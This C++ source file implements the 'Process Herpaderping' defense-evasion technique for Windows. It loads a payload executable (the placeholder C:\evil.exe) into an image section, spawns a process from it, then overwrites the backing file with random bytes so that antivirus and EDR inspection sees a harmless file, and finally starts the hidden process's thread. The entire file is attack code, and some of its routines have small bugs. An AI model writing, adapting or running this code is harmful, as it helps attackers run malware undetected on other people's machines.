/*
Title: Process Herpaderping
Resources:
	- https://github.com/jxy-s/herpaderping
*/

#include <Windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <bcrypt.h>
#include <UserEnv.h>
#include "ProcessHerpaderping.hpp"
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Userenv.lib")

_NtCreateProcessEx ntCreateProcessEx = nullptr;
_NtCreateSection ntCreateSection = nullptr;
_NtCreateThreadEx ntCreateThreadEx = nullptr;
_NtQueryInformationProcess ntQueryInformationProcess = nullptr;
_RtlCreateProcessParametersEx rtlCreateProcessParametersEx = nullptr;

VOID FreeAll(HMODULE hNtdll, HANDLE hPayloadFile, HANDLE hTargetFile, HANDLE hSection, HANDLE hProcess, HANDLE hThread) {
	if (hNtdll)
		FreeLibrary(hNtdll);
	if (hPayloadFile)
		CloseHandle(hPayloadFile);
	if (hTargetFile)
		CloseHandle(hTargetFile);
	if (hSection)
		CloseHandle(hSection);
	if (hProcess)
		CloseHandle(hProcess);
	if (hThread)
		CloseHandle(hThread);
}

BOOL InitFunctions(HMODULE hNtdll) {
	ntCreateProcessEx = reinterpret_cast<_NtCreateProcessEx>(GetProcAddress(hNtdll, "NtCreateProcessEx"));
	if (!ntCreateProcessEx) return FALSE;
	ntCreateSection = reinterpret_cast<_NtCreateSection>(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!ntCreateSection) return FALSE;
	ntCreateThreadEx = reinterpret_cast<_NtCreateThreadEx>(GetProcAddress(hNtdll, "NtCreateThreadEx"));
	if (!ntCreateThreadEx) return FALSE;
	ntQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (!ntQueryInformationProcess) return FALSE;
	rtlCreateProcessParametersEx = reinterpret_cast<_RtlCreateProcessParametersEx>(GetProcAddress(hNtdll, "RtlCreateProcessParametersEx"));
	if (!rtlCreateProcessParametersEx) return FALSE;
}

BOOL CopyDataToFile(HANDLE hSrcFile, HANDLE hDestFile) {
	// Get the file sizes.
	DWORD dwSrcSize = 0;
	dwSrcSize = GetFileSize(hSrcFile, &dwSrcSize);
	DWORD dwDestSize = 0;
	dwDestSize = GetFileSize(hDestFile, &dwDestSize);

	// Set the file pointers.
	if (SetFilePointer(hSrcFile, 0, nullptr, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		return FALSE;
	}
	if (SetFilePointer(hDestFile, 0, nullptr, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		return FALSE;
	}

	// Fill the buffer with 0s.
	DWORD dwBytesRemaining = dwSrcSize;
	std::vector<BYTE> buffer;
	if (dwBytesRemaining > MAX_FILE_BUFFER) {
		buffer.assign(MAX_FILE_BUFFER, 0);
	}
	else {
		buffer.assign(static_cast<SIZE_T>(dwBytesRemaining), 0);
	}

	// Copy
	DWORD dwBytesRead = 0;
	DWORD dwBytesWritten = 0;
	while (dwBytesRemaining > 0) {
		if (dwBytesRemaining < buffer.size()) {
			buffer.assign(static_cast<SIZE_T>(dwBytesRemaining), 0);
		}

		dwBytesRead = 0;
		if (!ReadFile(hSrcFile, buffer.data(), static_cast<DWORD>(buffer.size()), &dwBytesRead, nullptr)) {
			return FALSE;
		}

		dwBytesRemaining -= dwBytesRead;

		dwBytesWritten = 0;
		if (!WriteFile(hDestFile, buffer.data(), static_cast<DWORD>(buffer.size()), &dwBytesWritten, nullptr)) {
			return FALSE;
		}

	}

	if (!FlushFileBuffers(hDestFile)) {
		return FALSE;
	}

	return TRUE;
}

BOOL FillBufferWithPattern(std::vector<BYTE> &buffer, std::vector<BYTE> pattern) {
	if (buffer.empty()) return FALSE;

	DWORD dwBytesRemaining = buffer.size();
	while (dwBytesRemaining > 0) {
		DWORD dwLen = (pattern.size() > dwBytesRemaining ? dwBytesRemaining : pattern.size());

		std::memcpy(&buffer[buffer.size() - dwBytesRemaining], pattern.data(), pattern.size());

		dwBytesRemaining -= dwLen;
	}

	return TRUE;
}

BOOL OverwriteFileWithPattern(HANDLE hFile, std::vector<BYTE> pattern) {
	DWORD dwFileSize = 0;
	dwFileSize = GetFileSize(hFile, &dwFileSize);
	if (dwFileSize == 0) return FALSE;
	if (SetFilePointer(hFile, 0, nullptr, FILE_BEGIN) == INVALID_SET_FILE_POINTER) return FALSE;

	DWORD dwBytesRemaining = dwFileSize;
	std::vector<BYTE> buffer;
	if (dwBytesRemaining > MAX_FILE_BUFFER) {
		buffer.resize(MAX_FILE_BUFFER);
	}
	else {
		buffer.resize((SIZE_T)dwBytesRemaining);
	}

	if (!FillBufferWithPattern(buffer, pattern)) return FALSE;


	DWORD dwBytesWritten = 0;
	while (dwBytesRemaining) {
		if (dwBytesRemaining < buffer.size()) {
			buffer.resize((SIZE_T)dwBytesRemaining);
			if (!FillBufferWithPattern(buffer, pattern)) return FALSE;
		}

		dwBytesWritten = 0;
		if (!WriteFile(
			hFile,
			buffer.data(),
			(DWORD)buffer.size(),
			&dwBytesWritten,
			nullptr
		)) {
			return FALSE;
		}

		dwBytesRemaining -= dwBytesWritten;
	}

	if (!FlushFileBuffers(hFile)) return FALSE;

	return TRUE;
}

ULONGLONG GetImageEntryPointRVA(HANDLE hFile) {
	DWORD dwFileSize = 0;
	dwFileSize = GetFileSize(hFile, &dwFileSize);

	ULARGE_INTEGER uMappingSize;
	uMappingSize.QuadPart = dwFileSize;
	HANDLE hMapping = CreateFileMappingW(
		hFile,
		nullptr,
		PAGE_READONLY,
		uMappingSize.HighPart,
		uMappingSize.LowPart,
		nullptr
	);
	if (!hMapping) return FALSE;

	LPVOID lpView = MapViewOfFile(
		hMapping,
		FILE_MAP_READ,
		0,
		0,
		uMappingSize.LowPart
	);
	if (!lpView) {
		CloseHandle(hMapping);
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpView;
#ifdef _WIN64
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)pDosHeader + pDosHeader->e_lfanew);
#else
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG)pDosHeader + pDosHeader->e_lfanew);
#endif

	if (pNtHeaders) {
		return pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	}
	else {
		return 0;
	}
}

BOOL WriteRemoteProcessParameters(HANDLE hProcess, const std::wstring wImagePath) {
	PROCESS_BASIC_INFORMATION pbi{};
	NTSTATUS status = ntQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}

	UNICODE_STRING uImagePath;
	RtlInitUnicodeString(&uImagePath, wImagePath.c_str());

	std::wstring::size_type wStrType = wImagePath.find_last_of('\\');
	if (wStrType == std::wstring::npos)
		return FALSE;

	std::wstring wCurrentDir = wImagePath.substr(0, wStrType);
	if (wCurrentDir.empty())
		return FALSE;

	UNICODE_STRING uCurrentDir = { 0 };
	RtlInitUnicodeString(&uCurrentDir, wCurrentDir.c_str());

	const WCHAR dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllDir, dllDir);

	UNICODE_STRING uWindowName = { 0 };
	const WCHAR* windowName = (LPWSTR)L"360";
	RtlInitUnicodeString(&uWindowName, windowName);

	LPVOID environment;
	if (!CreateEnvironmentBlock(&environment, nullptr, TRUE)) {
		return FALSE;
	}

	PRTL_USER_PROCESS_PARAMETERS_T params;
	status = rtlCreateProcessParametersEx(
		(PRTL_USER_PROCESS_PARAMETERS*) &params,
		&uImagePath,
		&uDllDir,
		&uCurrentDir,
		&uImagePath,
		environment,
		&uWindowName,
		nullptr,
		nullptr,
		nullptr,
		0
	);

	// Calculate the required length.
	SIZE_T dwLen = params->MaximumLength + params->EnvironmentSize;

	LPVOID lpRemoteAddr = VirtualAllocEx(
		hProcess,
		nullptr,
		dwLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!lpRemoteAddr) return FALSE;

	// 
	if (params->Environment) {
		params->Environment = Add2Ptr(lpRemoteAddr, params->Length);
	}

	// Write the parameter into the remote process.
	if (!WriteProcessMemory(hProcess, lpRemoteAddr, params, dwLen, nullptr)) {
		return FALSE;
	}

	// Write the parameter pointer to the remote process PEB.
	if (!WriteProcessMemory(
		hProcess,
		Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB_T, ProcessParameters)),
		&lpRemoteAddr,
		sizeof(lpRemoteAddr),
		nullptr
	)) {
		return FALSE;
	}

	return TRUE;
}

BOOL ProcessHerpaderping() {
	std::wstring wPayloadPath = L"C:\\evil.exe"; // Replace it with your own executable file path to inject.
	std::wstring wTargetPath = L"C:\\target.exe"; // Replace it with target file path to be injected.

	NTSTATUS status;

	HMODULE hNtdll = (HMODULE)LoadLibraryA("ntdll.dll");
	if (!hNtdll) return FALSE;
	if (!InitFunctions(hNtdll)) return FALSE;
	
	// Generate random pattern buffer to overwrite the target file.
	std::vector<BYTE> patternBuffer;
	patternBuffer.resize(PATTERN_LENGTH);
	status = BCryptGenRandom(
		nullptr,
		patternBuffer.data(),
		static_cast<ULONG>(patternBuffer.size()),
		BCRYPT_USE_SYSTEM_PREFERRED_RNG
	);
	if (!NT_SUCCESS(status)) return FALSE;

	// Open the payload file.
	HANDLE hPayloadFile = CreateFileW(
		wPayloadPath.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (!hPayloadFile) return FALSE;

	DWORD dwPayloadSize = GetFileSize(hPayloadFile, &dwPayloadSize);
	if (dwPayloadSize == 0) {
		FreeAll(hNtdll, hPayloadFile, nullptr, nullptr, nullptr, nullptr);
		return FALSE;
	}

	// Create a directory
	if (!CreateDirectoryW(wTargetPath.c_str(), nullptr)) {
		FreeAll(hNtdll, hPayloadFile, nullptr, nullptr, nullptr, nullptr);
		return FALSE;
	}

	// Set Alternate Data Stream (ADS)
	wTargetPath += L":exe";

	// Create a target file.
	HANDLE hTargetFile = CreateFileW(
		wTargetPath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (!hTargetFile) {
		FreeAll(hNtdll, hPayloadFile, hTargetFile, nullptr, nullptr, nullptr);
		return FALSE;
	}

	// Copy the payload data to the temporary file.
	if (!CopyDataToFile(hPayloadFile, hTargetFile)) {
		FreeAll(hNtdll, hPayloadFile, hTargetFile, nullptr, nullptr, nullptr);
		return FALSE;
	}

	CloseHandle(hPayloadFile);

	// Create a section.
	HANDLE hSection = nullptr;
	status = ntCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		nullptr,
		nullptr,
		PAGE_READONLY,
		SEC_IMAGE,
		hTargetFile
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, nullptr, hTargetFile, hSection, nullptr, nullptr);
		return FALSE;
	}

	// Create a process.
	HANDLE hProcess = nullptr;
	status = ntCreateProcessEx(
		&hProcess,
		PROCESS_ALL_ACCESS,
		nullptr,
		NtCurrentProcess(),
		PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
		hSection,
		nullptr,
		nullptr,
		0
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, nullptr, hTargetFile, hSection, hProcess, nullptr);
		return FALSE;
	}
	
	CloseHandle(hSection);

	// Get the remote entry point RVA.
	ULONGLONG dwImageEntryPointRVA = GetImageEntryPointRVA(hTargetFile);
	if (dwImageEntryPointRVA == 0) {
		FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, nullptr);
		return FALSE;
	}
	
	// Overwrite the target file with random pattern.
	if (!OverwriteFileWithPattern(hTargetFile, patternBuffer)) {
		FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, nullptr);
		return FALSE;
	}

	// Get process information.
	PROCESS_BASIC_INFORMATION pbi{};
	status = ntQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, nullptr);
		return FALSE;
	}

	PEB_T peb{};
	if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), nullptr)) {
		FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, nullptr);
		return FALSE;
	}

	if (!WriteRemoteProcessParameters(hProcess, wTargetPath)) {
		FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, nullptr);
		return FALSE;
	}

	// Create the initial thread,
	PVOID pRemoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, dwImageEntryPointRVA);
	HANDLE hThread = nullptr;
	status = ntCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		hProcess,
		pRemoteEntryPoint,
		nullptr,
		0,
		0,
		0,
		0,
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, hThread);
		return FALSE;
	}

	FreeAll(hNtdll, nullptr, hTargetFile, nullptr, hProcess, hThread);

	return TRUE;
}
